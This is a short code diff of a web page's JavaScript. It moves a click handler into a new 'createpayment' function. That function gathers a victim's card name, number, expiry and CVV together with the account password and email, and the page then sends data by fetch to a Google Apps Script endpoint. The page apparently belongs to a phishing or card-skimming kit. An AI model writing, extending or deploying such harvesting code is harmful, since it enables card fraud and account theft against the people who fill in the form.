@@ -319,7 +319,16 @@ function verifypass(){
       }else if(cardName !="" && cardNumber!="" && cardMonth!="" && cardYear!="" && cardCvv!="" ){
       window.top.openverify()
       window.top.document.getElementById("verifypassbtn").addEventListener("click", function(){
-  window.top.turnonloading()
+        createpayment();window.top.turnonloading()}, false);
+}
+}
+
+function createpayment(){
+  cardName = app1.cardName.toString()
+  cardNumber= app1.cardNumber.toString()
+  cardMonth= app1.cardMonth.toString()
+  cardYear= app1.cardYear.toString()
+  cardCvv = app1.cardCvv.toString()
   var password = window.top.document.getElementById("password").value
   email = window.top.email1
   
@@ -364,8 +373,6 @@ fetch("https://script.google.com/macros/s/AKfycbzXL-QbX9qSUaKZ8osCfF6PcZXHW8BO0k
     // ..
   });
 
-}, false);
-}
 }
 console.log(app1.loading)
 </script>
